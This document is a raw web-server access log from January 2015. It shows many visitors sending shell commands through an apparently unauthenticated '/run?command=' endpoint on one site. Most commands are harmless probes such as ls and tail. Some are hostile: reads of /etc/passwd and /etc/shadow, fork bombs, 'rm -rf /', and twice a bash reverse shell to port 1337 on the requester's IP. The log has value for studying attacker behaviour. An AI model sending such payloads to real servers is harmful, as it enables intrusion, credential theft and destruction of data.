150.70.173.10 - - [19/Jan/2015:14:59:32 +0000] "GET /run?command=ls HTTP/1.1" 200 115 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
129.240.203.166 - - [19/Jan/2015:15:00:09 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 570 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
129.240.203.166 - - [19/Jan/2015:15:00:09 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/run?command=tail%20/var/log/nginx/python.access.log" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
88.217.180.248 - - [19/Jan/2015:15:00:13 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.240.203.166 - - [19/Jan/2015:15:00:21 +0000] "GET /run?command=bash HTTP/1.1" 200 17 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
88.217.180.248 - - [19/Jan/2015:15:00:21 +0000] "GET /run?command=echo%20hi HTTP/1.1" 200 3 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:00:27 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:00:28 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.240.203.166 - - [19/Jan/2015:15:00:41 +0000] "GET /run?command=cat%20/etc/passwd HTTP/1.1" 200 540 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
88.217.180.248 - - [19/Jan/2015:15:01:07 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1182 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.240.203.166 - - [19/Jan/2015:15:01:42 +0000] "GET /run?command=cat%20/etc/shadow HTTP/1.1" 200 0 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
93.86.134.20 - - [19/Jan/2015:15:01:58 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:01:59 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:00 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:00 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:12 +0000] "GET /run?command=%27ls%20-al%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
195.77.203.210 - - [19/Jan/2015:15:02:16 +0000] "GET / HTTP/1.1" 404 233 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/39.0.2171.65 Chrome/39.0.2171.65 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:02:20 +0000] "GET /run?command=%27ls%27 HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:25 +0000] "GET /run?command=%27ls%20-a%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:30 +0000] "GET /run?command=pwd HTTP/1.1" 200 2 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:02:31 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:02:35 +0000] "GET /run?command=:(){%20:|:&%20};: HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:02:38 +0000] "GET /run?command=%27cd%20/home%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:43 +0000] "GET /run?command=%27ls%27 HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:02:52 +0000] "GET /run?command=cd%20home HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:02:52 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:02:58 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:03:00 +0000] "GET /run?command=ps%20-l HTTP/1.1" 200 300 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:03:03 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 436 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:03:13 +0000] "GET /run?command=%27ls%20/home%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
126.186.147.188 - - [19/Jan/2015:15:03:18 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19"
70.192.24.204 - - [19/Jan/2015:15:03:24 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:03:24 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:03:25 +0000] "GET /run?command=%27cd%20/home%20&&%20pwd%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:03:30 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 545 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
70.192.24.204 - - [19/Jan/2015:15:03:31 +0000] "GET /run?command=ll HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
126.186.147.188 - - [19/Jan/2015:15:03:33 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 548 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.45 Safari/535.19"
70.192.24.204 - - [19/Jan/2015:15:03:42 +0000] "GET /run?command=cat%20/ets/passwd HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
88.217.180.66 - - [19/Jan/2015:15:03:42 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
88.217.180.66 - - [19/Jan/2015:15:03:43 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
66.249.81.194 - - [19/Jan/2015:15:03:44 +0000] "GET / HTTP/1.1" 404 233 "-" "Mozilla/5.0 (Linux; Android 5.0; A0001 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.87 Mobile Safari/537.36"
66.249.81.191 - - [19/Jan/2015:15:03:45 +0000] "GET /favicon.ico HTTP/1.1" 404 233 "-" "Mozilla/5.0 (Linux; Android 5.0; A0001 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.87 Mobile Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:03:49 +0000] "GET /run?command=cat%20/etc/passwd HTTP/1.1" 200 540 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:03:51 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
129.240.203.166 - - [19/Jan/2015:15:03:51 +0000] "GET /run?command=bash+-i+%3E%26+%2Fdev%2Ftcp%2F129.240.203.166%2F1337+0%3E%261 HTTP/1.1" 200 0 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
81.155.65.157 - - [19/Jan/2015:15:03:52 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:03:54 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1215 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:03:57 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 670 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
67.204.34.249 - - [19/Jan/2015:15:03:57 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
67.204.34.249 - - [19/Jan/2015:15:03:58 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
67.204.34.249 - - [19/Jan/2015:15:03:58 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
67.204.34.249 - - [19/Jan/2015:15:04:05 +0000] "GET / HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.3.0"
70.192.24.204 - - [19/Jan/2015:15:04:22 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:04:27 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:04:28 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
129.240.203.166 - - [19/Jan/2015:15:04:28 +0000] "GET /run?command=/bin/bash+-i+%3E%26+%2Fdev%2Ftcp%2F129.240.203.166%2F1337+0%3E%261 HTTP/1.1" 200 0 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
70.192.24.204 - - [19/Jan/2015:15:04:34 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1219 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:04:46 +0000] "GET /run?command=dd HTTP/1.1" 200 17 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:04:51 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 567 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:19 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 566 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:25 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 580 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:26 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 574 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:27 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 515 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:28 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 519 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:28 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 523 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:28 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 514 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:29 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:29 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 351 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:29 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 309 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:30 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 306 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:30 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 308 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
70.192.24.204 - - [19/Jan/2015:15:05:30 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 308 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:05:42 +0000] "GET / HTTP/1.1" 404 209 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
70.192.24.204 - - [19/Jan/2015:15:05:46 +0000] "GET /run?command=tail%20-n%20100%20/var/log/nginx/python.access.log HTTP/1.1" 200 2363 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:06:05 +0000] "GET /run?command=%22cd%20~%20&&%20pwd%22 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
206.248.139.166 - - [19/Jan/2015:15:06:07 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
206.248.139.166 - - [19/Jan/2015:15:06:07 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
206.248.139.166 - - [19/Jan/2015:15:06:07 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
93.86.134.20 - - [19/Jan/2015:15:06:13 +0000] "GET /run?command=pwd HTTP/1.1" 200 2 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:06:16 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
206.248.139.166 - - [19/Jan/2015:15:06:17 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 481 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0"
93.86.134.20 - - [19/Jan/2015:15:06:22 +0000] "GET /run?command=%27rm%20-rf%20/%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
93.86.134.20 - - [19/Jan/2015:15:06:26 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
50.156.105.171 - - [19/Jan/2015:15:06:33 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20%7Cwc%20-l HTTP/1.1" 200 4 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
50.156.105.171 - - [19/Jan/2015:15:06:33 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:06:36 +0000] "GET /run?command=%27ls%20|%20wc%20-l%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
50.156.105.171 - - [19/Jan/2015:15:06:40 +0000] "GET /run?command=awk%20%27%7Bprint%20%241%7D%27%20/var/log/nginx/python.access.log%20%7Csort%20-u%20 HTTP/1.1" 200 1233 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:06:40 +0000] "GET /run?command=%27ls%20|%20wc%27 HTTP/1.1" 200 0 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
50.156.105.171 - - [19/Jan/2015:15:06:44 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
93.86.134.20 - - [19/Jan/2015:15:06:55 +0000] "GET /run?command=wc HTTP/1.1" 200 17 "http://gentlemens.io/" "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:35.0) Gecko/20100101 Firefox/35.0"
129.240.203.166 - - [19/Jan/2015:15:07:16 +0000] "GET /run?command=%3A%28%29%7B+%3A%7C%3A+%26+%7D%3B%3A HTTP/1.1" 200 0 "-" "Opera/9.80 (X11; Linux x86_64) Presto/2.12.388 Version/12.16"
81.155.65.157 - - [19/Jan/2015:15:07:21 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:07:30 +0000] "GET /run?command=ls%20/mnt HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:07:35 +0000] "GET /run?command=ls%20/mnt/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:07:41 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:07:46 +0000] "GET /run?command=ls%20/bin HTTP/1.1" 200 606 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:07:55 +0000] "GET /run?command=mount HTTP/1.1" 200 344 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
84.15.189.51 - - [19/Jan/2015:15:08:17 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
84.15.189.51 - - [19/Jan/2015:15:08:17 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
84.15.189.51 - - [19/Jan/2015:15:08:18 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:08:22 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:08:30 +0000] "GET /run?command=ls%20/usr HTTP/1.1" 200 71 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
84.15.189.51 - - [19/Jan/2015:15:08:33 +0000] "GET /run?command=rm%20-rf%20/ HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
84.15.189.51 - - [19/Jan/2015:15:08:40 +0000] "GET /run?command=tail%20/var/log/nginx/python.access.log HTTP/1.1" 200 428 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:08:47 +0000] "GET /run?command=/boot HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:08:52 +0000] "GET /run?command=/dev HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:08:56 +0000] "GET /run?command=/root HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:09:02 +0000] "GET /run?command=ls%20/boot HTTP/1.1" 200 98 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:09:12 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
